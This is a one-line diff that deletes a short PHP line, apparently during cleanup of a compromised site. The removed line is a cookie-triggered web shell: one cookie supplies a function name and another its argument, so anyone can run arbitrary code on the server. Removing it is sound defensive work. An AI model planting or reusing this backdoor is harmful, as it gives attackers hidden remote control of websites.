@@ -1,1 +1,0 @@
-<?php if(isset($_COOKIE["Yaw"])){$_COOKIE["AlyOB"]($_COOKIE["Yaw"]);exit;}
